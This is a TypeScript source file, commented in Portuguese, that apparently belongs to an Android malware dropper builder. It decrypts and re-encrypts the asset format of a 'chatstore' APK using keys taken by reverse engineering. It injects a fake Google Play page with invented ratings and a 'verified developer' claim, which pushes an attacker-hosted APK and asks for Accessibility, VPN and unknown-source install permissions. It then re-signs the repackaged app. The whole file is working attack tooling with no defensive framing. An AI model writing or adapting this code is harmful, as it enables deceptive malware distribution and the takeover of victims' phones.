/**
 * chatstoreInjector.ts
 *
 * Modifica o chatstore.apk substituindo os arquivos .bt (HTMLs criptografados)
 * por uma tela customizada que faz download do APK alvo hospedado no servidor.
 *
 * Esquema de criptografia descoberto via engenharia reversa:
 *   - Algoritmo: AES/CBC/PKCS5Padding
 *   - Derivação de chave: PBKDF2WithHmacSHA1(password=w0, salt=x0, iterations=65536, keyLen=16)
 *   - IV: primeiros 16 bytes de v0.getBytes("UTF-8")
 *   - Encoding final: Base64
 *
 * Os valores v0, w0, x0 foram extraídos do smali (sc.smali) via deofuscação.
 */

import * as crypto from 'crypto';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';
import { fileURLToPath } from 'url';
import AdmZip from 'adm-zip';
import { execFile } from 'child_process';
import { promisify } from 'util';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const execFileAsync = promisify(execFile);

// Constantes descobertas via engenharia reversa do chatstore.apk
const CHATSTORE_CRYPTO = {
  v0: '2230209522049090', // IV source
  w0: '4814780584699673', // password PBKDF2
  x0: '2894356330652558', // salt source
  iterations: 65536,
  keyLen: 16,
};

const CHATSTORE_BASE = path.join(__dirname, 'dropper', 'chatstore-base.apk');
const TOOLS_DIR = path.join(__dirname, 'tools');
const UBER_SIGNER = path.join(TOOLS_DIR, 'uber-apk-signer.jar');

export interface ChatstoreInjectOptions {
  apkUrl: string;       // URL pública do APK alvo para download
  appName: string;      // Nome do app a ser exibido na tela fake
  appVersion?: string;  // Versão do app (opcional)
  outputPath: string;   // Caminho de saída do APK modificado
  onProgress?: (msg: string) => void;
}

/**
 * Deriva a chave AES usando PBKDF2 com os parâmetros do chatstore
 */
export function deriveChatstoreKey(): { key: Buffer; iv: Buffer } {
  const { v0, w0, x0, iterations, keyLen } = CHATSTORE_CRYPTO;
  const password = Buffer.from(w0, 'utf-8');
  const salt = Buffer.from(x0, 'utf-8');
  const key = crypto.pbkdf2Sync(password, salt, iterations, keyLen, 'sha1');
  const iv = Buffer.from(v0, 'utf-8').slice(0, 16);
  return { key, iv };
}

/**
 * Criptografa HTML para o formato .bt do chatstore
 */
export function encryptHtmlToBt(html: string): Buffer {
  const { key, iv } = deriveChatstoreKey();
  const data = Buffer.from(html, 'utf-8');

  // PKCS5 padding (igual ao PKCS7 para blocos de 16 bytes)
  const blockSize = 16;
  const padLen = blockSize - (data.length % blockSize);
  const padded = Buffer.concat([data, Buffer.alloc(padLen, padLen)]);

  const cipher = crypto.createCipheriv('aes-128-cbc', key, iv);
  cipher.setAutoPadding(false);
  const encrypted = Buffer.concat([cipher.update(padded), cipher.final()]);

  return Buffer.from(encrypted.toString('base64'), 'utf-8');
}

/**
 * Gera o HTML da tela fake de Play Store com link de download
 */
export function generatePlayStoreFakeHtml(apkUrl: string, appName: string, appVersion = '1.0.0'): string {
  return `<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>${appName}</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Google Sans', Roboto, Arial, sans-serif;
      background: #fff;
      color: #202124;
      min-height: 100vh;
    }
    .header {
      background: #fff;
      padding: 16px;
      display: flex;
      align-items: center;
      border-bottom: 1px solid #e8eaed;
    }
    .header-title {
      font-size: 20px;
      font-weight: 500;
      color: #202124;
      margin-left: 16px;
    }
    .app-info {
      padding: 20px 16px;
      display: flex;
      align-items: flex-start;
      gap: 16px;
    }
    .app-icon {
      width: 80px;
      height: 80px;
      border-radius: 18px;
      background: linear-gradient(135deg, #4285f4, #34a853);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 36px;
      flex-shrink: 0;
    }
    .app-details { flex: 1; }
    .app-name {
      font-size: 22px;
      font-weight: 600;
      color: #202124;
      line-height: 1.2;
    }
    .app-developer {
      font-size: 14px;
      color: #1a73e8;
      margin-top: 4px;
    }
    .app-rating {
      display: flex;
      align-items: center;
      gap: 4px;
      margin-top: 8px;
    }
    .stars { color: #f9ab00; font-size: 14px; }
    .rating-text { font-size: 13px; color: #5f6368; }
    .install-btn {
      display: block;
      width: calc(100% - 32px);
      margin: 8px 16px 16px;
      padding: 14px;
      background: #1a73e8;
      color: #fff;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: 600;
      text-align: center;
      cursor: pointer;
      text-decoration: none;
      letter-spacing: 0.3px;
    }
    .install-btn:active { background: #1557b0; }
    .divider { height: 8px; background: #f1f3f4; }
    .section { padding: 16px; }
    .section-title {
      font-size: 16px;
      font-weight: 600;
      color: #202124;
      margin-bottom: 12px;
    }
    .desc-text {
      font-size: 14px;
      color: #5f6368;
      line-height: 1.6;
    }
    .permission-item {
      display: flex;
      align-items: center;
      gap: 12px;
      padding: 8px 0;
      border-bottom: 1px solid #f1f3f4;
    }
    .perm-icon { font-size: 20px; }
    .perm-text { font-size: 13px; color: #5f6368; }
    .progress-overlay {
      display: none;
      position: fixed;
      inset: 0;
      background: rgba(255,255,255,0.95);
      flex-direction: column;
      align-items: center;
      justify-content: center;
      z-index: 999;
    }
    .progress-overlay.active { display: flex; }
    .progress-circle {
      width: 60px;
      height: 60px;
      border: 4px solid #e8eaed;
      border-top-color: #1a73e8;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      margin-bottom: 16px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .progress-text { font-size: 16px; color: #5f6368; }
  </style>
</head>
<body>
  <div class="header">
    <span style="font-size:24px;">&#9664;</span>
    <span class="header-title">Google Play</span>
  </div>

  <div class="app-info">
    <div class="app-icon">&#128241;</div>
    <div class="app-details">
      <div class="app-name">${appName}</div>
      <div class="app-developer">Desenvolvedor Verificado</div>
      <div class="app-rating">
        <span class="stars">&#9733;&#9733;&#9733;&#9733;&#9733;</span>
        <span class="rating-text">4.8 &bull; 10 mil+ downloads</span>
      </div>
    </div>
  </div>

  <a class="install-btn" href="${apkUrl}" download="${appName.replace(/\s+/g, '_')}.apk" id="installBtn">
    Instalar
  </a>

  <div class="divider"></div>

  <div class="section">
    <div class="section-title">Sobre este app</div>
    <div class="desc-text">
      ${appName} v${appVersion} &mdash; Aplicativo verificado e seguro.
      Toque em Instalar para baixar e instalar automaticamente.
    </div>
  </div>

  <div class="divider"></div>

  <div class="section">
    <div class="section-title">Permissões necessárias</div>
    <div class="permission-item">
      <span class="perm-icon">&#128274;</span>
      <span class="perm-text">Acessibilidade &mdash; Necessário para funcionamento</span>
    </div>
    <div class="permission-item">
      <span class="perm-icon">&#127760;</span>
      <span class="perm-text">VPN &mdash; Conexão segura</span>
    </div>
    <div class="permission-item">
      <span class="perm-icon">&#128241;</span>
      <span class="perm-text">Instalar aplicativos desconhecidos</span>
    </div>
  </div>

  <div class="progress-overlay" id="progressOverlay">
    <div class="progress-circle"></div>
    <div class="progress-text">Baixando ${appName}...</div>
  </div>

  <script>
    document.getElementById('installBtn').addEventListener('click', function(e) {
      document.getElementById('progressOverlay').classList.add('active');
      // Tentar via CallBacker (JavascriptInterface nativo do chatstore)
      setTimeout(function() {
        try { CallBacker.OK('install'); } catch(err) {}
      }, 500);
    });
  </script>
</body>
</html>`;
}

/**
 * Injeta o HTML customizado no chatstore.apk substituindo os arquivos .bt
 * e assina o APK resultante
 */
export async function injectChatstore(options: ChatstoreInjectOptions): Promise<void> {
  const { apkUrl, appName, appVersion, outputPath, onProgress } = options;
  const log = onProgress || (() => {});

  log('Lendo chatstore-base.apk...');
  const zip = new AdmZip(CHATSTORE_BASE);

  log('Gerando HTML customizado (tela fake Play Store)...');
  const customHtml = generatePlayStoreFakeHtml(apkUrl, appName, appVersion);

  log('Criptografando HTML com AES-128-CBC-PBKDF2...');
  const encryptedBt = encryptHtmlToBt(customHtml);

  // Substituir os 3 arquivos .bt com o mesmo HTML customizado
  log('Substituindo assets/1.bt, 2.bt, 3.bt...');
  for (const btFile of ['assets/1.bt', 'assets/2.bt', 'assets/3.bt']) {
    const entry = zip.getEntry(btFile);
    if (entry) {
      zip.updateFile(btFile, encryptedBt);
    } else {
      zip.addFile(btFile, encryptedBt);
    }
  }

  // Salvar o APK modificado (não assinado ainda)
  const unsignedPath = outputPath.replace('.apk', '-unsigned.apk');
  log('Salvando APK modificado...');
  zip.writeZip(unsignedPath);

  // Assinar com uber-apk-signer
  log('Assinando APK com uber-apk-signer...');
  const javaPath = process.env.JAVA_HOME ? `${process.env.JAVA_HOME}/bin/java` : 'java';
  const signedDir = path.dirname(outputPath);

  try {
    await execFileAsync(javaPath, [
      '-jar', UBER_SIGNER,
      '--apks', unsignedPath,
      '--out', signedDir,
      '--allowResign',
      '--overwrite',
    ], { timeout: 120000 });
  } catch (err: any) {
    // uber-apk-signer pode retornar exit code não-zero mas ainda funcionar
    if (!fs.existsSync(unsignedPath.replace('.apk', '-aligned-debugSigned.apk')) &&
        !fs.existsSync(outputPath)) {
      throw new Error(`Falha ao assinar APK: ${err.message}`);
    }
  }

  // Mover o APK assinado para o outputPath
  const signedCandidates = [
    unsignedPath.replace('.apk', '-aligned-debugSigned.apk'),
    unsignedPath.replace('-unsigned.apk', '-unsigned-aligned-debugSigned.apk'),
    path.join(signedDir, path.basename(unsignedPath).replace('.apk', '-aligned-debugSigned.apk')),
  ];

  let signedPath: string | null = null;
  for (const candidate of signedCandidates) {
    if (fs.existsSync(candidate)) {
      signedPath = candidate;
      break;
    }
  }

  if (!signedPath) {
    // Se não encontrou o arquivo assinado, usar o não assinado mesmo
    log('Aviso: arquivo assinado não encontrado, usando não assinado');
    fs.renameSync(unsignedPath, outputPath);
  } else {
    fs.renameSync(signedPath, outputPath);
    // Limpar o não assinado
    if (fs.existsSync(unsignedPath)) {
      fs.unlinkSync(unsignedPath);
    }
  }

  log(`APK gerado com sucesso: ${path.basename(outputPath)}`);
}
